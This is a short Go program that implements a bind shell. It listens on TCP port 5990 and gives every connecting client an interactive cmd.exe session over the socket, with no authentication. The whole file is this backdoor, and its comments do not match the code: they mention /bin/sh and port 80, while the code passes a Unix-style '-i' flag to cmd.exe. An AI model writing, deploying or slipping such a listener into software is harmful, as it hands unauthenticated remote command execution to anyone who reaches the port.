package main

import (
	"net"
	"bufio"
	"log"
	"os/exec"
	"io"
)
// Flusher wraps bufio.Writer, explicitly flushing on all writes.
type Flusher struct {
	w *bufio.Writer
}

// NewFlusher creates a new Flusher from io.Writer
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

// Write writes bytes and explicitly flushes buffer
func (foo *Flusher) Write(b []byte) (int, error){
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

func handle(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.
	// For Windows use exec.Command("cmd.exe").
	cmd := exec.Command("cmd.exe", "-i")

	// Set stdin to our connection
	cmd.Stdin = conn

	// Create a Flusher from the connection to use for stdout.
	// This ensures a stdout is flushed adequately and sent via net.Conn.
	cmd.Stdout = NewFlusher(conn)

	// Run the command
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func main() {
	// Listen on local port 80
	listener, err := net.Listen("tcp", ":5990")
	if err != nil {
		log.Fatalln("Unable to bind port")
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}
		go handle(conn)
	}
}